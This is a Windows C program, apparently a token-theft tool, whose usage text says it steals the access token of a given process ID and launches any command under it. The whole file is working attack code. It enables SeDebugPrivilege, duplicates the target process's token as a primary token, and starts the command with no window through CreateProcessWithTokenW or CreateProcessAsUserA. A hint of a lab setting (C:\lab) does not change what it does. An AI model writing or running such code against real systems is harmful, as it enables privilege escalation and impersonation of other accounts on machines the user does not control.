#include <windows.h>
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <pid> <command>\n", argv[0]);
        printf("  Steals token from <pid>, launches <command> under it\n");
        return 1;
    }

    DWORD target_pid = atoi(argv[1]);
    char *cmd = argv[2];

    /* ---- 1. Enable SeDebugPrivilege on our own token ---- */
    HANDLE hSelf;
    OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hSelf);
    TOKEN_PRIVILEGES tp;
    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid);
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ok = AdjustTokenPrivileges(hSelf, FALSE, &tp, 0, NULL, NULL);
    DWORD err = GetLastError();
    CloseHandle(hSelf);
    if (!ok || err == ERROR_NOT_ALL_ASSIGNED) {
        printf("[-] Cannot enable SeDebugPrivilege (run as admin)\n");
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled\n");

    /* ---- 2. Open target process ---- */
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
    if (!hProcess) {
        printf("[-] OpenProcess(%lu) failed: %lu\n", target_pid, GetLastError());
        return 1;
    }
    printf("[+] Opened PID %lu\n", target_pid);

    /* ---- 3. Get its token ---- */
    HANDLE hProcToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcToken)) {
        printf("[-] OpenProcessToken failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Got token handle\n");

    /* ---- 4. Duplicate as primary token ---- */
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hProcToken,
            TOKEN_ALL_ACCESS, NULL,
            SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
        CloseHandle(hProcToken);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Duplicated token (primary)\n");

    /* ---- 5. Convert command to wide string ---- */
    int wlen = MultiByteToWideChar(CP_ACP, 0, cmd, -1, NULL, 0);
    WCHAR *wcmd = (WCHAR *)malloc(wlen * sizeof(WCHAR));
    MultiByteToWideChar(CP_ACP, 0, cmd, -1, wcmd, wlen);

    /* ---- 6. Launch with stolen token ---- */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
            NULL, wcmd, CREATE_NO_WINDOW, NULL, L"C:\\lab", &si, &pi)) {
        printf("[-] CreateProcessWithTokenW failed: %lu\n", GetLastError());
        printf("    Trying CreateProcessAsUserA...\n");

        STARTUPINFOA siA;
        ZeroMemory(&siA, sizeof(siA));
        siA.cb = sizeof(siA);
        ZeroMemory(&pi, sizeof(pi));

        if (!CreateProcessAsUserA(hDupToken, NULL, cmd, NULL, NULL, FALSE,
                                  CREATE_NO_WINDOW, NULL, "C:\\lab", &siA, &pi)) {
            printf("[-] CreateProcessAsUserA failed: %lu\n", GetLastError());
            free(wcmd);
            CloseHandle(hDupToken);
            CloseHandle(hProcToken);
            CloseHandle(hProcess);
            return 1;
        }
    }

    printf("[+] Command launched as stolen token\n");
    printf("[+] New PID: %lu\n", pi.dwProcessId);
    printf("[*] Zero bytes written to PID %lu — token read only\n", target_pid);

    free(wcmd);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hDupToken);
    CloseHandle(hProcToken);
    CloseHandle(hProcess);
    return 0;
}
